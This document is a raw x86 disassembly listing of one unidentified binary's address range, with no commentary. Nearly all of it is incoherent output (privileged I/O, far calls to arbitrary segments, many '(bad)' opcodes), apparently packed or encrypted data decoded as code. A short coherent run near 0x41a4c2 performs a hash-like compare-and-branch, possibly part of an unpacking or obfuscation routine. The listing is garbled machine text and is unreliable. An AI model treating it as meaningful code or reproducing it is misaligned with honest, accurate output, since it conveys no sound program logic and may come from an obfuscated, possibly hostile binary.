  41a227:	inc    edx
  41a228:	sub    BYTE PTR [edi-0x44],bh
  41a22b:	sar    BYTE PTR [edx+0x6b7039a3],0x1
  41a232:	mov    ebx,0x2206e39
  41a237:	cmp    DWORD PTR ss:[bx-0x5749],ebp
  41a23d:	mov    bh,0xf6
  41a23f:	pop    edx
  41a240:	sti    
  41a241:	in     eax,0xaf
  41a243:	ins    DWORD PTR es:[edi],dx
  41a244:	test   ebx,ebx
  41a246:	std    
  41a247:	hlt    
  41a248:	mov    WORD PTR [ecx+ecx*4+0x3b],?
  41a24c:	mov    ecx,0x60a099ec
  41a251:	rcr    BYTE PTR [esi+0x5f],cl
  41a254:	mov    cl,0x1e
  41a256:	jnp    0x41a232
  41a258:	pushf  
  41a259:	mov    ds:0xfac470a8,al
  41a25e:	dec    edx
  41a25f:	sbb    eax,0x69e194cc
  41a264:	mov    al,0xcb
  41a266:	mov    bh,0x39
  41a268:	cmp    ebp,ecx
  41a26a:	pusha  
  41a26b:	dec    edi
  41a26c:	xlat   BYTE PTR ds:[ebx]
  41a26d:	fs or  al,0x4
  41a270:	sub    al,0x11
  41a272:	cmp    al,0x50
  41a274:	lahf   
  41a275:	adc    al,0xc7
  41a277:	pop    ds
  41a278:	retf   
  41a279:	out    0x22,al
  41a27b:	shl    BYTE PTR [ecx+edi*4+0x3],cl
  41a27f:	add    bl,bl
  41a281:	mov    ds:0xd40103a,al
  41a286:	test   DWORD PTR [ebx],ecx
  41a288:	xchg   BYTE PTR [esi+0xfc2f0e6],cl
  41a28e:	dec    esi
  41a28f:	adc    eax,0x36ed65c3
  41a294:	jg     0x41a2c0
  41a296:	mov    ecx,0x9e35dc4e
  41a29b:	sub    al,0x13
  41a29d:	nop
  41a29e:	cmp    DWORD PTR [ebp+0x77],0xffffff86
  41a2a2:	ss cs (bad) 
  41a2a5:	pop    eax
  41a2a6:	sub    BYTE PTR [eax],ch
  41a2a8:	mov    ah,0x97
  41a2aa:	sar    BYTE PTR [esi],0xb
  41a2ad:	sbb    BYTE PTR [eax-0x39],bh
  41a2b0:	cmp    al,0x8f
  41a2b2:	int3   
  41a2b3:	out    dx,eax
  41a2b4:	xor    al,0xd2
  41a2b6:	fsubr  st,st(5)
  41a2b8:	enter  0xd134,0x67
  41a2bc:	jns    0x41a293
  41a2be:	clc    
  41a2bf:	shr    DWORD PTR [esi+0x66d83cd9],0x38
  41a2c6:	sub    eax,eax
  41a2c8:	dec    edx
  41a2c9:	xor    ebp,eax
  41a2cb:	hlt    
  41a2cc:	lahf   
  41a2cd:	jb     0x41a2c2
  41a2cf:	mov    ch,0xc3
  41a2d1:	retf   0xacc9
  41a2d4:	aaa    
  41a2d5:	pushf  
  41a2d6:	cdq    
  41a2d7:	xlat   BYTE PTR ds:[ebx]
  41a2d8:	mov    eax,0x52822592
  41a2dd:	std    
  41a2de:	jge    0x41a2ca
  41a2e0:	cwde   
  41a2e1:	fsub   QWORD PTR [esi+0x35]
  41a2e4:	jnp    0x41a2c1
  41a2e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2e7:	stc    
  41a2e8:	xor    al,0x88
  41a2ea:	les    esi,FWORD PTR [esi-0x4b24f105]
  41a2f0:	test   eax,0x5575bb23
  41a2f5:	jnp    0x41a32c
  41a2f7:	dec    edi
  41a2f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2f9:	pop    ds
  41a2fa:	cmp    eax,0xaab7dfb7
  41a2ff:	dec    edx
  41a300:	xor    al,BYTE PTR [eax+0x53ea051d]
  41a306:	in     al,0x7c
  41a308:	xchg   ebx,eax
  41a309:	gs dec esi
  41a30b:	mov    eax,ebp
  41a30d:	rol    ebx,1
  41a30f:	pop    ebx
  41a310:	loopne 0x41a36e
  41a312:	pop    ecx
  41a313:	ret    0x2e80
  41a316:	mov    ch,0x8f
  41a318:	ret    
  41a319:	pop    DWORD PTR [edi]
  41a31b:	and    BYTE PTR [edi-0x71],0x2e
  41a31f:	push   ss
  41a320:	jno    0x41a33c
  41a322:	mov    bh,0x88
  41a324:	not    DWORD PTR [ebx]
  41a326:	cmp    al,BYTE PTR [ebp+eax*1-0x7b3aedad]
  41a32d:	lds    ecx,FWORD PTR [ebp+0x551caeab]
  41a333:	and    ch,ah
  41a335:	test   al,0xc2
  41a337:	mov    eax,0xeb4bf7f6
  41a33c:	inc    ecx
  41a33d:	mov    eax,0x5fff7561
  41a342:	mul    bl
  41a344:	ins    DWORD PTR es:[edi],dx
  41a345:	popf   
  41a346:	or     edi,DWORD PTR [ecx]
  41a348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a349:	adc    eax,0x1795c09b
  41a34e:	cmp    edi,edi
  41a350:	mov    eax,0xd52c618b
  41a355:	jnp    0x41a3ba
  41a357:	mov    edx,edi
  41a359:	mov    dh,0x16
  41a35b:	rcr    DWORD PTR [edx+0x4a],cl
  41a35e:	or     edi,DWORD PTR [ebx-0x378a0052]
  41a364:	dec    eax
  41a365:	rcl    BYTE PTR ds:0xcf3e0f8e,0xb9
  41a36c:	out    dx,eax
  41a36d:	ss popf 
  41a36f:	fs pop eax
  41a371:	pop    ebp
  41a372:	mov    ebp,DWORD PTR [eax]
  41a374:	lahf   
  41a375:	adc    bh,BYTE PTR [eax+0x44]
  41a378:	out    0x21,al
  41a37a:	frstor [ecx-0x3e]
  41a37d:	pop    edi
  41a37e:	out    dx,eax
  41a37f:	dec    ebp
  41a380:	dec    eax
  41a381:	jl     0x41a37f
  41a383:	push   ecx
  41a384:	sub    DWORD PTR [ebp-0x12],esp
  41a387:	rol    DWORD PTR [esi+0x19],0xe5
  41a38b:	xor    edi,DWORD PTR [eax-0x63]
  41a38e:	arpl   WORD PTR [edi],dx
  41a390:	and    eax,0x4d
  41a393:	imul   cx,cx,0xffef
  41a397:	xchg   edi,eax
  41a398:	(bad)  
  41a399:	mov    ch,0x5
  41a39b:	sti    
  41a39c:	mov    ?,WORD PTR [ecx-0x2a]
  41a39f:	pop    edi
  41a3a0:	sub    al,0xc4
  41a3a2:	ficomp WORD PTR [ecx+0x5f68df00]
  41a3a8:	ins    DWORD PTR es:[edi],dx
  41a3a9:	xchg   esi,eax
  41a3aa:	out    0xe4,eax
  41a3ac:	jmp    FWORD PTR [edx]
  41a3ae:	scas   al,BYTE PTR es:[edi]
  41a3af:	mov    esi,0x414687f8
  41a3b4:	fld    TBYTE PTR [bx+0x6087]
  41a3b9:	mov    al,0x3e
  41a3bb:	scas   al,BYTE PTR es:[edi]
  41a3bc:	gs jno 0x41a395
  41a3bf:	xor    eax,0xfe49560
  41a3c4:	pop    ds
  41a3c5:	mov    eax,ds:0x85ff5de3
  41a3ca:	stc    
  41a3cb:	sbb    bh,dl
  41a3cd:	addr16 inc edi
  41a3cf:	lgs    edx,FWORD PTR ds:0x623e43ca
  41a3d6:	arpl   WORD PTR [edx],dx
  41a3d8:	out    0xf3,al
  41a3da:	daa    
  41a3db:	shr    BYTE PTR [edx-0x5ad7b8ee],cl
  41a3e1:	push   ebp
  41a3e2:	ret    
  41a3e3:	xchg   edi,eax
  41a3e4:	ja     0x41a42d
  41a3e6:	retf   0xa1d2
  41a3e9:	mov    edx,ebx
  41a3eb:	in     al,0x8d
  41a3ed:	in     eax,dx
  41a3ee:	aad    0x82
  41a3f0:	pop    ds
  41a3f1:	jbe    0x41a3cb
  41a3f3:	sub    dh,al
  41a3f5:	cmp    ch,BYTE PTR [esp+ebx*8+0x47]
  41a3f9:	sar    DWORD PTR [edx-0x62],cl
  41a3fc:	or     BYTE PTR [edx+0x77],ch
  41a3ff:	mov    bl,0xb2
  41a401:	fld1   
  41a403:	call   0x3825:0xe14cec6c
  41a40a:	sub    ebp,DWORD PTR [edx+0x5a]
  41a40d:	aas    
  41a40e:	and    BYTE PTR [ebx],bh
  41a410:	dec    esi
  41a411:	(bad)  
  41a412:	mov    eax,ds:0x717879c8
  41a417:	mov    eax,0xca70df29
  41a41c:	stos   DWORD PTR es:[edi],eax
  41a41d:	(bad)  
  41a41e:	mov    edx,0xc5323d3c
  41a423:	pop    es
  41a424:	retf   0xa646
  41a427:	sbb    ebp,esi
  41a429:	mov    ch,0x5b
  41a42b:	cmp    BYTE PTR [eax],ah
  41a42d:	and    eax,0x3ab52f9b
  41a432:	and    eax,0x63331bcb
  41a437:	jns    0x41a4b6
  41a439:	lock sub eax,edi
  41a43c:	cmp    al,0x8c
  41a43e:	rcr    ch,0x23
  41a441:	bound  edi,QWORD PTR [eax+0x31]
  41a444:	dec    esp
  41a445:	sar    BYTE PTR [ebx],1
  41a447:	inc    eax
  41a448:	adc    edi,edx
  41a44a:	test   DWORD PTR [esi-0x11a9bbbd],ebx
  41a450:	fisttp DWORD PTR [ecx+0x7a]
  41a453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a454:	data16 dec BYTE PTR [edx]
  41a457:	repz (bad) [ecx-0x10]
  41a45b:	dec    eax
  41a45c:	fld    TBYTE PTR [ebp+0x40]
  41a45f:	out    0x17,al
  41a461:	and    ebp,DWORD PTR [ebx+edi*4]
  41a464:	pop    edi
  41a465:	xor    DWORD PTR [ecx+edi*1+0x0],edx
  41a469:	sub    eax,0x40e3671e
  41a46e:	lds    edx,FWORD PTR [eax]
  41a470:	cmp    eax,0x4bcd650f
  41a475:	or     BYTE PTR [ecx+0x2f660168],ch
  41a47b:	jne    0x41a4e0
  41a47d:	shr    BYTE PTR [esi-0x33],0x78
  41a481:	mov    ebp,0x251d67e2
  41a486:	dec    edx
  41a487:	inc    eax
  41a488:	addr16 out dx,eax
  41a48a:	pop    ss
  41a48b:	jmp    0xa468:0xfb40b9
  41a492:	(bad)  
  41a494:	repnz add al,0xca
  41a497:	arpl   WORD PTR [edx],ax
  41a499:	mov    eax,ds:0x7b60fd01
  41a49e:	fwait
  41a49f:	adc    ebp,DWORD PTR [edx]
  41a4a1:	mov    esp,0xd04add51
  41a4a6:	or     al,0xc3
  41a4a8:	sahf   
  41a4a9:	push   0xba927715
  41a4ae:	in     al,0xf9
  41a4b0:	mov    edx,0x331b785d
  41a4b5:	repnz add eax,ecx
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8+0x3f84c2ab]
  41a500:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a501:	dec    eax
  41a502:	add    BYTE PTR [ecx+0x62],ah
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx+0x14]
  41a50a:	out    dx,eax
  41a50b:	jne    0x41a519
  41a50d:	ins    DWORD PTR es:[edi],dx
  41a50e:	pop    ebx
  41a50f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a510:	mov    BYTE PTR [eax],dl
  41a512:	inc    ecx
  41a513:	and    bl,BYTE PTR es:[eax]
  41a516:	repz popa 
  41a518:	cmp    edi,esi
  41a51a:	xor    bh,BYTE PTR es:0xef6aee9e
  41a521:	jbe    0x41a583
  41a523:	jno    0x41a535
  41a525:	pop    ebp
  41a526:	xlat   BYTE PTR ds:[ebx]
  41a527:	std    
  41a528:	cmp    eax,eax
  41a52a:	out    dx,eax
  41a52b:	push   0xffffffb5
  41a52d:	shl    DWORD PTR [edx],cl
  41a52f:	repz or ebp,DWORD PTR [ecx-0x41fb36a3]
  41a536:	scas   al,BYTE PTR es:[edi]
  41a537:	mov    ebx,0xf75471c9
  41a53c:	pop    ds
  41a53d:	push   esp
  41a53e:	popa   
  41a53f:	stos   DWORD PTR es:[edi],eax
  41a540:	sbb    DWORD PTR [esi+0x5fc6d8d6],eax
  41a546:	and    dh,BYTE PTR [esi]
  41a548:	or     eax,0x71993f90
  41a54d:	sbb    DWORD PTR [ecx],ebp
  41a54f:	aas    
  41a550:	xlat   BYTE PTR ds:[ebx]
  41a551:	call   0x2878:0x729d2a4
  41a558:	inc    eax
  41a559:	push   esi
  41a55a:	and    dh,BYTE PTR [eax]
  41a55c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a55d:	aam    0xe5
  41a55f:	xchg   DWORD PTR ds:0x846691b1,edx
  41a565:	dec    edi
  41a566:	and    al,0xee
  41a568:	test   dl,0xb8
  41a56b:	out    dx,eax
  41a56c:	inc    ebp
  41a56d:	mov    ds:0x768fdcae,eax
  41a572:	or     al,0xf9
  41a574:	jno    0x41a57d
  41a576:	sub    esi,DWORD PTR [edi+0x1d]
  41a579:	dec    ebp
  41a57a:	out    dx,eax
  41a57b:	fwait
  41a57c:	push   0x64bfab12
  41a581:	not    DWORD PTR [esi+ebx*8]
  41a584:	push   esp
  41a585:	jne    0x41a55c
  41a587:	lahf   
  41a588:	xor    BYTE PTR [esi-0x49],0xfb
  41a58c:	or     bl,BYTE PTR [esi+0x26]
  41a58f:	out    0x49,eax
  41a591:	xor    al,0x22
  41a593:	addr16 jp 0x41a55d
  41a596:	leave  
  41a597:	and    DWORD PTR [ebx+0x19],eax
  41a59a:	sub    dl,BYTE PTR [esi]
  41a59c:	mov    ecx,0x79616736
  41a5a1:	jb     0x41a543
  41a5a3:	int    0xe9
  41a5a5:	mov    BYTE PTR [ebx-0x6192cc5e],bl
  41a5ab:	push   0x771ac292
  41a5b0:	mov    WORD PTR [ebp+0x7328341b],si
  41a5b7:	jecxz  0x41a61e
  41a5b9:	daa    
  41a5ba:	gs loopne 0x41a63c
  41a5bd:	out    dx,al
  41a5be:	or     eax,0xdb6ac838
  41a5c3:	push   ebp
  41a5c4:	mov    ch,0xb
  41a5c6:	shl    DWORD PTR [ebx+eiz*8+0x33],0x7a
  41a5cb:	jmp    0xfa3ad123
  41a5d0:	mov    dh,0xf4
  41a5d2:	rcl    DWORD PTR [edi+eiz*4-0xc],cl
  41a5d6:	dec    esp
  41a5d7:	pushf  
  41a5d8:	test   al,0x44
  41a5da:	push   eax
  41a5db:	mov    cl,0x4b
  41a5dd:	icebp  
  41a5de:	retf   
  41a5df:	and    eax,0xbfb2344f
  41a5e4:	mov    ch,0xe
  41a5e6:	dec    ebx
  41a5e7:	push   ds
  41a5e8:	or     esp,0xba11f1a6
  41a5ee:	xor    DWORD PTR [ebx-0x453b36df],esi
  41a5f4:	pop    eax
  41a5f5:	xchg   ebx,eax
  41a5f6:	ds loope 0x41a5d6
  41a5f9:	mov    dl,0x92
  41a5fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5fc:	in     al,0xe2
  41a5fe:	fwait
  41a5ff:	and    eax,0x37f98f38
  41a604:	pop    edx
  41a605:	dec    eax
  41a606:	add    BYTE PTR [edx-0x4c6fb47e],ah
  41a60c:	call   0x4795:0x6900b9d9
  41a613:	(bad)  
  41a614:	out    dx,eax
  41a615:	dec    eax
  41a616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a617:	mov    ebp,0x106ef5c2
  41a61c:	and    DWORD PTR [esi-0x1f468d48],eax
  41a622:	loope  0x41a63a
  41a624:	jo     0x41a604
  41a626:	dec    esp
  41a627:	or     bh,BYTE PTR ds:0x61b95ba4
  41a62d:	jge    0x41a5cb
  41a62f:	scas   eax,DWORD PTR es:[edi]
  41a630:	and    al,0x37
  41a632:	pop    ss
  41a633:	ins    BYTE PTR es:[edi],dx
  41a634:	push   edx
  41a635:	mov    ds:0xf208f3fc,eax
  41a63a:	sbb    eax,0x10a9407
  41a63f:	mov    esi,0xd52e71b7
  41a644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a645:	out    0xbe,al
  41a647:	jmp    0x41a6c8
  41a649:	fiadd  WORD PTR [ebx]
  41a64b:	add    al,0xcb
  41a64d:	rcr    BYTE PTR [ebp+0x7d],0x10
  41a651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a652:	fstp   DWORD PTR [eax-0x7]
  41a655:	xlat   BYTE PTR ds:[ebx]
  41a656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a657:	or     BYTE PTR [esp+ebp*1-0x21],ch
  41a65b:	hlt    
  41a65c:	ficomp WORD PTR [ebx+0x627893ac]
  41a662:	pop    ebp
  41a663:	adc    ecx,ebx
  41a665:	inc    ecx
  41a666:	add    esi,DWORD PTR [ebx-0x15]
  41a669:	mov    ebx,0x61d57397
  41a66e:	cmp    dh,BYTE PTR [edx+eiz*2]
  41a671:	pop    eax
  41a672:	cld    
  41a673:	daa    
  41a674:	test   DWORD PTR [ebx],0x9393c2f8
  41a67a:	aad    0xee
  41a67c:	fdivp  st(2),st
  41a67e:	mov    eax,DWORD PTR [edi]
  41a680:	js     0x41a677
  41a682:	add    al,0xd
  41a684:	scas   eax,DWORD PTR es:[edi]
  41a685:	aas    
  41a686:	jge    0x41a677
  41a688:	cmp    bl,bl
  41a68a:	dec    ebx
  41a68b:	dec    ebp
  41a68c:	or     cl,BYTE PTR [esi+0x24c7f831]
  41a692:	mov    bl,0xdf
  41a694:	arpl   WORD PTR [edi],sp
  41a696:	in     eax,0x14
  41a698:	scas   eax,DWORD PTR es:[edi]
  41a699:	xchg   ebp,eax
  41a69a:	sub    eax,0xa0cf66fd
  41a69f:	sub    al,0xc5
  41a6a1:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41a6a3:	lock sub BYTE PTR [edx+eiz*2-0x7b],bh
  41a6a8:	cdq    
  41a6a9:	push   ds
  41a6aa:	(bad)  
  41a6ab:	mov    al,ds:0xafd72928
  41a6b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6b1:	xor    eax,0x62330928
  41a6b6:	pop    ds
  41a6b7:	test   al,al
  41a6b9:	test   eax,0x9dfc5ae2
  41a6be:	leave  
  41a6bf:	neg    BYTE PTR [edx+0x73]
  41a6c2:	sbb    al,0x97
  41a6c4:	dec    ebp
  41a6c5:	xor    al,0x1d
  41a6c7:	test   al,0xbe
  41a6c9:	addr16 jmp 0x41a65a
  41a6cc:	pop    eax
  41a6cd:	push   0x75560db1
  41a6d2:	dec    ebx
  41a6d3:	enter  0x395b,0x21
  41a6d7:	ret    0xbcc3
  41a6da:	pop    es
  41a6db:	xchg   esi,eax
  41a6dc:	cs (bad) 
  41a6de:	test   al,0x61
  41a6e0:	test   bl,bl
  41a6e2:	imul   DWORD PTR [eax-0x7381ab99]
  41a6e8:	popa   
  41a6e9:	int    0xbd
  41a6eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6ec:	test   DWORD PTR [edx],ebx
  41a6ee:	and    cl,BYTE PTR [ebx]
  41a6f0:	data16 fmul DWORD PTR [eax]
  41a6f3:	sbb    ebp,esp
  41a6f5:	add    ecx,DWORD PTR [edi+ecx*4]
  41a6f8:	dec    ebp
  41a6f9:	rcr    DWORD PTR [edx+0x7],cl
  41a6fc:	fcom   DWORD PTR [edi-0xb]
  41a6ff:	js     0x41a6f5
  41a701:	js     0x41a767
  41a703:	popa   
  41a704:	mov    cl,0x98
  41a706:	sub    bl,dh
  41a708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a709:	dec    eax
  41a70a:	ins    DWORD PTR es:[edi],dx
  41a70b:	push   ss
  41a70c:	or     BYTE PTR [ebx+0x19],bh
  41a70f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a710:	les    eax,FWORD PTR [esi]
  41a712:	sahf   
  41a713:	adc    cl,dh
  41a715:	scas   eax,DWORD PTR es:[edi]
  41a716:	lahf   
  41a717:	jo     0x41a769
  41a719:	in     eax,dx
  41a71a:	in     al,0x8c
  41a71c:	dec    eax
  41a71d:	cmp    al,0x93
  41a71f:	rol    DWORD PTR [edx],0xc3
  41a722:	jg     0x41a782
  41a724:	dec    edx
  41a725:	sub    ebx,0xffffffac
  41a728:	fistp  WORD PTR ds:0xdf0292a5
  41a72e:	pop    DWORD PTR [ebp-0x9decdda]
  41a734:	jnp    0x41a6fb
  41a736:	dec    ebx
  41a737:	push   eax
  41a738:	outs   dx,BYTE PTR ds:[esi]
  41a739:	adc    esp,0xffffff8f
  41a73c:	fbstp  TBYTE PTR [ebx-0x48]
  41a73f:	fadd   QWORD PTR [edi-0x64]
  41a742:	daa    
  41a743:	fdivr  DWORD PTR [ebp-0x61]
  41a746:	pop    esi
  41a747:	add    eax,0x95ee47a6
  41a74c:	dec    ecx
  41a74d:	repz ret 
  41a74f:	inc    ebp
  41a750:	mul    al
  41a752:	ret    0xb1ac
  41a755:	or     cl,0x37
  41a758:	mov    ch,0x77
  41a75a:	pop    ecx
  41a75b:	jo     0x41a7c8
  41a75d:	cmp    dl,ch
  41a75f:	and    eax,0x572b3a5
  41a764:	(bad)  
  41a765:	call   0xb52:0x7bffe9fc
  41a76c:	inc    esp
  41a76d:	or     ecx,DWORD PTR [eax+eax*1+0x6e4c3c2a]
  41a774:	gs (bad) 
  41a776:	push   esi
  41a777:	call   0xf26d18a0
  41a77c:	mov    dh,0xa0
  41a77e:	lds    edx,FWORD PTR [edx]
  41a780:	dec    ebp
  41a781:	sar    DWORD PTR [ebx],1
  41a783:	enter  0xf620,0x8c
  41a787:	pop    ds
  41a788:	xor    BYTE PTR [ecx-0x65e35804],ch
  41a78e:	xchg   ebx,eax
  41a78f:	xchg   edx,eax
  41a790:	and    cl,BYTE PTR [ebp-0x4485f785]
  41a796:	cmp    al,0xaf
  41a798:	aam    0xa4
  41a79a:	cs ds out 0x4,eax
  41a79e:	mov    al,0x60
  41a7a0:	lea    edx,[esi+0x1cbb57a1]
  41a7a6:	test   al,0xc
  41a7a8:	and    eax,0x783e8fb3
  41a7ad:	dec    eax
  41a7ae:	add    ch,ch
  41a7b0:	ss sub bh,cl
  41a7b3:	mov    ds:0xf8bcbc26,al
  41a7b8:	daa    
  41a7b9:	fsub   QWORD PTR [edx-0x6421ef80]
  41a7bf:	dec    ebp
  41a7c0:	(bad)  
  41a7c1:	xor    al,0x6d
  41a7c3:	push   edx
  41a7c4:	jnp    0x41a7f4
  41a7c6:	clc    
  41a7c7:	xchg   esi,eax
  41a7c8:	lods   eax,DWORD PTR ds:[esi]
  41a7c9:	js     0x41a832
  41a7cb:	dec    esi
  41a7cc:	pop    ebx
  41a7cd:	mov    cl,0x10
  41a7cf:	and    al,0x3d
  41a7d1:	dec    esp
  41a7d2:	mov    dh,0x3a
  41a7d4:	enter  0xeb57,0x52
  41a7d8:	icebp  
  41a7d9:	neg    DWORD PTR [ebp-0x80]
  41a7dc:	dec    ebx
  41a7dd:	aas    
  41a7de:	cmc    
  41a7df:	or     edx,esp
  41a7e1:	ror    ebp,0x82
  41a7e4:	js     0x41a78f
  41a7e6:	xchg   esp,eax
  41a7e7:	out    dx,al
  41a7e8:	test   edi,ebx
  41a7ea:	repz and DWORD PTR [edi+0x28],edi
  41a7ee:	les    edi,FWORD PTR [ecx]
  41a7f0:	les    ebp,FWORD PTR [edx-0x6bfe234f]
  41a7f6:	push   eax
  41a7f8:	ds mov edx,0x9a10551b
  41a7fe:	addr16 jl 0x41a7c5
  41a801:	sub    eax,0x8250a4de
  41a806:	out    0x85,al
  41a808:	push   eax
  41a809:	ss dec esi
  41a80b:	daa    
  41a80c:	aaa    
  41a80d:	push   edi
  41a80e:	dec    ecx
  41a80f:	aam    0x6a
  41a811:	pop    edx
  41a812:	aaa    
  41a813:	sub    BYTE PTR [esp+edi*8],bl
  41a816:	xchg   edx,eax
  41a817:	jle    0x41a7c3
  41a819:	inc    ebx
  41a81a:	(bad)  
  41a81b:	xor    al,0xb3
  41a81d:	jbe    0x41a899
  41a81f:	test   al,0x93
  41a821:	outs   dx,DWORD PTR ds:[esi]
  41a822:	and    esi,ecx
  41a824:	int    0x24
  41a826:	int3   
  41a827:	and    eax,0x337c22c3
  41a82c:	out    0x8b,al
  41a82e:	call   0x46b8:0xc8bece33
  41a835:	aam    0x46
  41a837:	imul   esp,DWORD PTR [ecx],0xf3227516
  41a83d:	cmp    ebp,DWORD PTR [esi+0x20ddb207]
  41a843:	cmc    
  41a844:	jmp    0x426c:0x5d34d188
  41a84b:	xchg   ebx,eax
  41a84c:	popa   
  41a84d:	js     0x41a8ce
  41a84f:	xchg   ebp,eax
  41a850:	into   
  41a851:	int3   
  41a852:	sbb    eax,0x38a35998
  41a857:	mov    ebx,0xad56439e
  41a85c:	pcmpgtw mm7,QWORD PTR [ecx-0x62]
  41a860:	jle    0x41a81f
  41a862:	shr    BYTE PTR [esi],1
  41a864:	xor    eax,0x932d9d94
  41a869:	mov    ch,0x35
  41a86b:	popf   
  41a86c:	in     eax,dx
  41a86d:	push   eax
  41a86e:	loope  0x41a841
  41a870:	inc    esi
  41a871:	inc    edx
  41a872:	in     eax,0x85
  41a874:	push   ebx
  41a875:	call   0x59ea:0xcc7f96bd
  41a87c:	jb     0x41a8ec
  41a87e:	mov    bh,cl
  41a880:	adc    al,0x33
  41a882:	outs   dx,BYTE PTR ds:[si]
  41a884:	clc    
  41a885:	mov    eax,ds:0xa90f249c
  41a88a:	adc    BYTE PTR [ebp-0x6803beca],cl
  41a890:	std    
  41a891:	ret    
  41a892:	push   es
  41a893:	add    ch,bl
  41a895:	inc    edx
  41a896:	loop   0x41a852
  41a898:	cs add esp,edi
  41a89b:	out    dx,eax
  41a89c:	mov    ds:0xaaa34e1a,al
  41a8a1:	ret    0x96fb
  41a8a4:	xchg   ebp,eax
  41a8a5:	xor    eax,0xcfe26d87
  41a8aa:	sti    
  41a8ab:	test   al,0x5b
  41a8ad:	(bad)  [eax-0x2e06de20]
  41a8b3:	jbe    0x41a855
  41a8b5:	inc    ebp
  41a8b6:	test   al,0x82
  41a8b8:	xor    al,0x67
  41a8ba:	adc    bl,BYTE PTR [ecx+ecx*4+0x561d134e]
  41a8c1:	xchg   ebp,ecx
  41a8c3:	stos   DWORD PTR es:[edi],eax
  41a8c4:	sub    eax,0x6d25abf1
  41a8c9:	(bad)  
  41a8ca:	adc    eax,0x78cd4ef
  41a8cf:	sub    ah,BYTE PTR [ecx+0x59]
  41a8d2:	inc    edi
  41a8d3:	mov    dl,0x37
  41a8d5:	dec    edx
  41a8d6:	mov    edx,0xcadf7193
  41a8db:	out    0xe,al
  41a8dd:	jmp    0x41a8c5
  41a8df:	jns    0x41a8b2
  41a8e1:	or     esp,DWORD PTR [edi-0x6319aeee]
  41a8e7:	or     edx,DWORD PTR [ebp-0x38d3eefe]
  41a8ed:	(bad)  
  41a8ef:	or     eax,0xb9154cb2
  41a8f4:	mov    ecx,DWORD PTR [esi+0x3a]
  41a8f7:	and    al,ah
  41a8f9:	std    
  41a8fa:	adc    DWORD PTR [ebx+0x60e3795a],ebx
  41a900:	and    dl,BYTE PTR [eax-0x16]
  41a903:	test   al,0x5
  41a905:	cld    
  41a906:	xchg   esi,eax
  41a907:	push   cs
  41a908:	daa    
  41a909:	sub    eax,0x57b9590a
  41a90e:	xor    esp,DWORD PTR [esi+edx*2+0x284edf2f]
  41a915:	ds or  eax,0xd517fec
  41a91b:	jge    0x41a99a
  41a91d:	xchg   edx,edx
  41a91f:	or     eax,0x37d7348e
  41a925:	mov    edx,0x1558669d
  41a92a:	push   ss
  41a92b:	push   0x4b
  41a92d:	or     ebx,0x55
  41a930:	shl    DWORD PTR [ecx+ecx*4-0x32],0xd0
  41a935:	cmc    
  41a936:	jo     0x41a985
  41a938:	sbb    eax,0xb369baa1
  41a93d:	mov    ecx,0xc401a0da
  41a942:	retf   0xde11
  41a945:	or     BYTE PTR [ecx],ch
  41a947:	std    
  41a948:	das    
  41a949:	mov    dl,0x84
  41a94b:	mov    edi,0x247748d9
  41a950:	add    eax,0xfff48b92
  41a955:	ds out 0x38,al
  41a958:	bound  esi,QWORD PTR [ecx+0x76]
  41a95b:	cmp    edi,DWORD PTR [edi]
  41a95d:	or     eax,0xe9e1c504
  41a962:	bound  ebp,QWORD PTR [esi+0x4c]
  41a965:	sbb    DWORD PTR [edi-0x6d],ecx
  41a968:	lock sub al,0xf7
  41a96b:	int    0xd9
  41a96d:	mov    bl,0x1
  41a96f:	aas    
  41a970:	scas   eax,DWORD PTR es:[edi]
  41a971:	jno    0x41a9dd
  41a973:	aas    
  41a974:	(bad)  
  41a976:	ds or  ebp,ebx
  41a979:	mov    al,ds:0xe3065181
  41a97e:	mov    dh,0xf6
  41a980:	gs aad 0x83
  41a983:	jno    0x41a94c
  41a985:	mov    dl,0x6c
  41a987:	(bad)
  41a98a:	cld    
  41a98b:	mov    BYTE PTR [esi-0x729b5ac9],al
  41a991:	enter  0xb674,0x1e
  41a995:	push   esi
  41a996:	inc    eax
  41a997:	mov    edx,0x17959fd3
  41a99c:	mov    ebp,0x14034fcf
  41a9a1:	add    BYTE PTR [edx+eiz*4+0x42bd3f1d],ah
  41a9a8:	outs   dx,DWORD PTR ds:[esi]
